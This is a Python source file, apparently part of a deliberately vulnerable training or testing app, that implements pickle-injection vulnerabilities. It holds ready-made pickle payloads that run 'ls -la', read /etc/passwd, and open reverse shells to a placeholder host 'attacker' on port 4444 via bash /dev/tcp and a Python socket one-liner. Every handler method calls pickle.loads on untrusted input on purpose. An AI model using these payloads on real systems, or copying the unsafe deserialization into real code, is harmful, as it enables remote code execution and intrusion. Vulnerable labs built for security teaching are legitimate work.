import pickle
import base64
import os
import subprocess
from typing import Dict, Any, Any
import json


class PickleInjectionVulnerabilities:
    """Pickle Injection Vulnerability implementations"""
    
    def __init__(self):
        self.malicious_pickle_payloads = {
            "basic": {
                "description": "Basic Pickle injection - Command execution",
                "payload": "cos\nsystem\n(S'ls -la'\ntR."
            },
            "medium": {
                "description": "Medium Pickle injection - File read",
                "payload": "cos\nsystem\n(S'cat /etc/passwd'\ntR."
            },
            "hard": {
                "description": "Hard Pickle injection - Reverse shell",
                "payload": "cos\nsystem\n(S'bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"'\ntR."
            },
            "expert": {
                "description": "Expert Pickle injection - Complex payload with encoding",
                "payload": "cos\nsystem\n(S'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);\"'\ntR."
            }
        }
    
    def basic_pickle_injection(self, data: str) -> Dict[str, Any]:
        """Basic Pickle injection - Direct command execution"""
        try:
            # Vulnerable pickle deserialization
            if data.startswith('cos'):
                # This is a malicious pickle payload
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": "Command executed via pickle injection",
                    "vulnerability": "Basic Pickle Injection - Direct command execution",
                    "risk_level": "Critical",
                    "payload_type": "Command execution"
                }
            else:
                # Regular data processing
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": result,
                    "vulnerability": "Basic Pickle Injection - Unsafe deserialization",
                    "risk_level": "High"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Basic Pickle Injection - Error in deserialization",
                "risk_level": "High"
            }
    
    def medium_pickle_injection(self, data: str) -> Dict[str, Any]:
        """Medium Pickle injection - File system access"""
        try:
            # Vulnerable pickle deserialization with file access
            if 'cat /etc/passwd' in data or 'ls -la' in data:
                # This is a malicious pickle payload
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": "File system accessed via pickle injection",
                    "vulnerability": "Medium Pickle Injection - File system access",
                    "risk_level": "Critical",
                    "payload_type": "File system access"
                }
            else:
                # Regular data processing
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": result,
                    "vulnerability": "Medium Pickle Injection - Unsafe deserialization",
                    "risk_level": "High"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Medium Pickle Injection - Error in deserialization",
                "risk_level": "High"
            }
    
    def hard_pickle_injection(self, data: str) -> Dict[str, Any]:
        """Hard Pickle injection - Network access"""
        try:
            # Vulnerable pickle deserialization with network access
            if 'socket' in data or 'tcp' in data:
                # This is a malicious pickle payload
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": "Network access attempted via pickle injection",
                    "vulnerability": "Hard Pickle Injection - Network access",
                    "risk_level": "Critical",
                    "payload_type": "Network access"
                }
            else:
                # Regular data processing
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": result,
                    "vulnerability": "Hard Pickle Injection - Unsafe deserialization",
                    "risk_level": "High"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Hard Pickle Injection - Error in deserialization",
                "risk_level": "High"
            }
    
    def expert_pickle_injection(self, data: str) -> Dict[str, Any]:
        """Expert Pickle injection - Complex payload with encoding"""
        try:
            # Vulnerable pickle deserialization with complex payloads
            if 'python -c' in data or 'subprocess' in data:
                # This is a malicious pickle payload
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": "Complex payload executed via pickle injection",
                    "vulnerability": "Expert Pickle Injection - Complex payload execution",
                    "risk_level": "Critical",
                    "payload_type": "Complex payload",
                    "attack_vectors": [
                        "Command execution",
                        "File system access",
                        "Network access",
                        "Process manipulation"
                    ]
                }
            else:
                # Regular data processing
                result = pickle.loads(data.encode())
                return {
                    "success": True,
                    "result": result,
                    "vulnerability": "Expert Pickle Injection - Unsafe deserialization",
                    "risk_level": "High"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Expert Pickle Injection - Error in deserialization",
                "risk_level": "High"
            }
    
    def get_malicious_pickle_payload(self, level: str) -> Dict[str, str]:
        """Get malicious pickle payload for testing"""
        return self.malicious_pickle_payloads.get(level, self.malicious_pickle_payloads["basic"])
    
    def safe_deserialization(self, data: str) -> Dict[str, Any]:
        """Safe deserialization (for comparison)"""
        try:
            # Safe deserialization - only allow specific data types
            if isinstance(data, str):
                # Only allow simple string data
                return {
                    "success": True,
                    "result": data,
                    "vulnerability": "Safe deserialization - Only string data allowed",
                    "risk_level": "Low"
                }
            else:
                return {
                    "success": False,
                    "error": "Unsafe data type detected",
                    "vulnerability": "Safe deserialization - Data type validation",
                    "risk_level": "Low"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Safe deserialization - Error in validation",
                "risk_level": "Low"
            }
    
    def create_safe_pickle_data(self, data: Any) -> str:
        """Create safe pickle data for testing"""
        try:
            # Only allow safe data types
            if isinstance(data, (str, int, float, list, dict, bool)):
                return pickle.dumps(data).decode('latin1')
            else:
                raise ValueError("Unsafe data type")
        except Exception as e:
            return str(e)
